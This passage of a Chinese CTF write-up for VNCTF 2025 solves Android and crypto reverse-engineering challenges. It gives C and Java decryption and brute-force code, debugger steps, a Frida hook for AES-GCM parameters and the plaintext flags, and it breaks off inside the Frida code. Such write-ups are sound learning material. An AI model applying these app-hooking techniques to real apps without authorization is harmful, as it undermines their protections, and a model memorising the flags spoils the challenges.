class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> Input[] = <span class="string">&quot;1111111111111111&quot;</span>;</span><br><span class="line">    <span class="type">uint8_t</span> c[]&#123; <span class="number">0x38</span>,<span class="number">0xd4</span>,<span class="number">0xCC</span>,<span class="number">0xDA</span>,<span class="number">0x59</span>,<span class="number">0x00</span>,<span class="number">0x44</span>,<span class="number">0x87</span>,<span class="number">0x80</span>,<span class="number">0x0A</span>,<span class="number">0xB5</span>,<span class="number">0x39</span>,<span class="number">0xA0</span>,<span class="number">0xDA</span>,<span class="number">0x49</span>,<span class="number">0xE3</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, Input[i] ^ c[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Key</span></span><br><span class="line"><span class="comment">// 09 E5 FD EB 68 31 75 B6 B1 3B 84 08 91 EB 78 D2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再用cyberchef AES解密得到Flag.</p><p><img src="/2025/02/12/VNCTF2025/fuko10.png" alt="QQ_1739077689242"></p><h4 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{W0w_u_g0t_Fuk0’s_st4rf1sh}</strong></p><h3 id="Hook-Fish"><a href="#Hook-Fish" class="headerlink" title="Hook Fish"></a>Hook Fish</h3><p>jadx分析APK, 发现他会下载一个hook_fish.dex文件, 然后调用里面的check、encode、decode函数。但是他又会delete文件，所以得动调断点在这边然后手动去复制一份文件。</p><p><img src="/2025/02/12/VNCTF2025/fish1.png" alt="QQ_1739078061506"></p><p><img src="/2025/02/12/VNCTF2025/fish2.png" alt="QQ_1739078112517"></p><p>在delete前断点，启动调试，然后输入点击按钮断下，在文件夹中搜到hook_fish.dex复制到windows。</p><p><img src="/2025/02/12/VNCTF2025/fish3.png" alt="QQ_1739078448944"></p><p><img src="/2025/02/12/VNCTF2025/fish4.png" alt="QQ_1739078521968"></p><p>jadx分析hook_fish.dex可以发现有以下几个函数，以及一个被加密的flag。</p><p><img src="/2025/02/12/VNCTF2025/fish5.png" alt="QQ_1739078659633"></p><p>使用decode函数即可解密第一层，第二层解密就是用apk里面的encrypt进行写解密函数。</p><p><img src="/2025/02/12/VNCTF2025/fish6.png" alt="QQ_1739078766431"></p><p>这边发现加密后的1字节对2字节的，也就是从逐字节往后添加进行爆破，免得写解密函数了。</p><p>完整解密代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;String, Character&gt; fish_dcode;</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;Character, String&gt; fish_ecode;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">strr</span> <span class="operator">=</span> <span class="string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Main</span><span class="params">()</span> &#123;</span><br><span class="line">        encode_map();</span><br><span class="line">        decode_map();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">encode_map</span><span class="params">()</span> &#123;</span><br><span class="line">        HashMap&lt;Character, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode = hashMap;</span><br><span class="line">        hashMap.put(<span class="string">&#x27;a&#x27;</span>, <span class="string">&quot;iiijj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;b&#x27;</span>, <span class="string">&quot;jjjii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;c&#x27;</span>, <span class="string">&quot;jijij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;d&#x27;</span>, <span class="string">&quot;jjijj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;e&#x27;</span>, <span class="string">&quot;jjjjj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;f&#x27;</span>, <span class="string">&quot;ijjjj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;g&#x27;</span>, <span class="string">&quot;jjjji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;h&#x27;</span>, <span class="string">&quot;iijii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;i&#x27;</span>, <span class="string">&quot;ijiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;j&#x27;</span>, <span class="string">&quot;iiiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;k&#x27;</span>, <span class="string">&quot;jjjij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;l&#x27;</span>, <span class="string">&quot;jijji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;m&#x27;</span>, <span class="string">&quot;ijiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;n&#x27;</span>, <span class="string">&quot;iijji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;o&#x27;</span>, <span class="string">&quot;ijjij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;p&#x27;</span>, <span class="string">&quot;jiiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;q&#x27;</span>, <span class="string">&quot;ijijj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;r&#x27;</span>, <span class="string">&quot;jijii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;s&#x27;</span>, <span class="string">&quot;iiiii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;t&#x27;</span>, <span class="string">&quot;jjiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;u&#x27;</span>, <span class="string">&quot;ijjji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;v&#x27;</span>, <span class="string">&quot;jiiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;w&#x27;</span>, <span class="string">&quot;iiiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;x&#x27;</span>, <span class="string">&quot;iijij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;y&#x27;</span>, <span class="string">&quot;jjiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;z&#x27;</span>, <span class="string">&quot;jijjj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;1&#x27;</span>, <span class="string">&quot;iijjl&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;2&#x27;</span>, <span class="string">&quot;iiilj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;3&#x27;</span>, <span class="string">&quot;iliii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;4&#x27;</span>, <span class="string">&quot;jiili&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;5&#x27;</span>, <span class="string">&quot;jilji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;6&#x27;</span>, <span class="string">&quot;iliji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;7&#x27;</span>, <span class="string">&quot;jjjlj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;8&#x27;</span>, <span class="string">&quot;ijljj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;9&#x27;</span>, <span class="string">&quot;iljji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;0&#x27;</span>, <span class="string">&quot;jjjli&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">decode_map</span><span class="params">()</span> &#123;</span><br><span class="line">        HashMap&lt;String, Character&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode = hashMap;</span><br><span class="line">        hashMap.put(<span class="string">&quot;iiijj&quot;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjii&quot;</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijij&quot;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjijj&quot;</span>, <span class="string">&#x27;d&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjjj&quot;</span>, <span class="string">&#x27;e&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijjjj&quot;</span>, <span class="string">&#x27;f&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjji&quot;</span>, <span class="string">&#x27;g&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijii&quot;</span>, <span class="string">&#x27;h&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijiji&quot;</span>, <span class="string">&#x27;i&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiiji&quot;</span>, <span class="string">&#x27;j&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjij&quot;</span>, <span class="string">&#x27;k&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijji&quot;</span>, <span class="string">&#x27;l&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijiij&quot;</span>, <span class="string">&#x27;m&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijji&quot;</span>, <span class="string">&#x27;n&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijjij&quot;</span>, <span class="string">&#x27;o&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jiiji&quot;</span>, <span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijijj&quot;</span>, <span class="string">&#x27;q&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijii&quot;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiiii&quot;</span>, <span class="string">&#x27;s&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjiij&quot;</span>, <span class="string">&#x27;t&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijjji&quot;</span>, <span class="string">&#x27;u&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jiiij&quot;</span>, <span class="string">&#x27;v&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiiij&quot;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijij&quot;</span>, <span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjiji&quot;</span>, <span class="string">&#x27;y&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijjj&quot;</span>, <span class="string">&#x27;z&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijjl&quot;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiilj&quot;</span>, <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iliii&quot;</span>, <span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jiili&quot;</span>, <span class="string">&#x27;4&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jilji&quot;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iliji&quot;</span>, <span class="string">&#x27;6&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjlj&quot;</span>, <span class="string">&#x27;7&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijljj&quot;</span>, <span class="string">&#x27;8&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iljji&quot;</span>, <span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjli&quot;</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">encode</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            sb.append(<span class="built_in">this</span>.fish_ecode.get(Character.valueOf(str.charAt(i))));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">decode</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i2 &lt; str.length() / <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> i + <span class="number">5</span>;</span><br><span class="line">            sb.append(<span class="built_in">this</span>.fish_dcode.get(str.substring(i, i3)));</span><br><span class="line">            i2++;</span><br><span class="line">            i = i3;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encrypt</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] str1 = str.getBytes();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str1.length; i++) &#123;</span><br><span class="line">            str1[i] = (<span class="type">byte</span>) (str1[i] + <span class="number">68</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hexStringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : str1) &#123;</span><br><span class="line">            hexStringBuilder.append(String.format(<span class="string">&quot;%02x&quot;</span>, Byte.valueOf(b)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> hexStringBuilder.toString();</span><br><span class="line">        <span class="type">char</span>[] str3 = str2.toCharArray();</span><br><span class="line">        codes(str3, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; str3.length; i2++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (str3[i2] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; str3[i2] &lt;= <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">                str3[i2] = (<span class="type">char</span>) ((str3[i2] - <span class="string">&#x27;1&#x27;</span>) + (i2 % <span class="number">4</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                str3[i2] = (<span class="type">char</span>) (str3[i2] + <span class="string">&#x27;7&#x27;</span> + (i2 % <span class="number">10</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(str3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">codes</span><span class="params">(<span class="type">char</span>[] a, <span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= a.length - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        a[index] = (<span class="type">char</span>) (a[index] ^ a[index + <span class="number">1</span>]);</span><br><span class="line">        a[index + <span class="number">1</span>] = (<span class="type">char</span>) (a[index] ^ a[index + <span class="number">1</span>]);</span><br><span class="line">        a[index] = (<span class="type">char</span>) (a[index] ^ a[index + <span class="number">1</span>]);</span><br><span class="line">        codes(a, index + <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 解密一层</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">encflag</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>().decode(<span class="string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(encflag);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">candidates</span> <span class="operator">=</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;_!?.~&amp;*()_+=@#$%^&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">decrypted</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">currentIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 爆破</span></span><br><span class="line">        <span class="keyword">while</span> (currentIndex &lt; encflag.length())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">found</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历候选字符</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c : candidates.toCharArray())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 加密</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">encrypted</span> <span class="operator">=</span> encrypt(decrypted + String.valueOf(c));</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 判断加密后的后两个字符是否与目标字符串匹配</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> encrypted.substring(currentIndex, currentIndex + <span class="number">2</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> encflag.substring(currentIndex, currentIndex + <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (s1.equals(s2))</span><br><span class="line">                &#123;</span><br><span class="line">                    decrypted.append(c);</span><br><span class="line">                    currentIndex += <span class="number">2</span>;</span><br><span class="line">                    found = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出还原的明文</span></span><br><span class="line">        System.out.println(decrypted.toString());</span><br><span class="line">        <span class="comment">// VNCTF&#123;u_re4l1y_kn0w_H0Ok_my_f1Sh!1l&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Flag-4"><a href="#Flag-4" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{u_re4l1y_kn0w_H0Ok_my_f1Sh!1l}</strong></p><h3 id="kotlindroid"><a href="#kotlindroid" class="headerlink" title="kotlindroid"></a>kotlindroid</h3><p>jadx分析发现有个check函数，这个Base64加密后的应该就是Flag，然后查看交叉调用找到上层。</p><p><img src="/2025/02/12/VNCTF2025/kot1.png" alt="d0aed962ce69b047bd07052cc50206ac"></p><p>发现下面这边调用了check，传进来了一个key，直接动调断点获取。</p><p><img src="/2025/02/12/VNCTF2025/kot2.png" alt="img"></p><p>在这边断点，即可看到两个modifiedKey数组，合并起来就是16字节的Key了。</p><p>{97,116,114,105,107,101,121,115,115,121,101,107,105,114,116,97}</p><p><img src="/2025/02/12/VNCTF2025/kot3.png" alt="cd8e014f2fe16b9a2a1bba1e2226049e"></p><p>但是这边没看到和base64相关加密，全局搜索base64在SearchActivityKt$sec$1中的invokeSuspend函数中看到。</p><p>这边应该就是那边check函数invoke后跳过来的，可以看到是AES GCM加密，IV是”114514”，Key是Check那边断点拿到的，AAD数据没法直接获取，使用frida hook拦截JNI.INSTANCE.getAt()函数。</p><p><img src="/2025/02/12/VNCTF2025/kot4.png" alt="QQ_1739079484622"></p><p><img src="/2025/02/12/VNCTF2025/kot5.png" alt="QQ_1739079580281"></p><p>frida代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 